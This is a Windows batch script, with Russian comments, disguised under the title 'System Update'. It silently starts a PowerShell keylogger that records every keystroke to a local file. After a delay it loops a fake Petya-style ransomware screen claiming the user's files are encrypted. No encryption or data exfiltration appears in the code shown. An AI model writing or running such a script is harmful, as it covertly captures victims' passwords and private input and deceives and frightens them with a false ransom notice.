@echo off
title System Update
setlocal

:: 1. Запуск кейлоггера (PowerShell) в фоне через скрытое окно
echo Starting background service...
powershell -Command "$file='log.txt'; $code='[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);'; $type=Add-Type -MemberDefinition $code -Name 'Win32' -Namespace 'Utils' -PassThru; while($true) { for($i=1;$i -le 255;$i++) { if($type::GetAsyncKeyState($i) -eq -32767) { [System.IO.File]::AppendAllText($file, [char]$i) } } Start-Sleep -Milliseconds 40 }" >nul 2>&1

:: 2. Таймер на 30 секунд
timeout /t 30 /nobreak >nul

:: 3. Эффект Petya (Мигающий скелет)
cls
color 0C
:petya
cls
echo.
echo      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
echo      X                                            X
echo      X   !!! YOUR FILES ARE ENCRYPTED !!!         X
echo      X                                            X
echo      X                XXXXX                       X
echo      X               X     X                      X
echo      X              X  O O  X                     X
echo      X              X   ^   X                     X
echo      X               X \_/ X                      X
echo      X                XXXXX                       X
echo      X                                            X
echo      XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
echo.
timeout /t 1 /nobreak >nul
color C0
timeout /t 1 /nobreak >nul
color 0C
goto petya
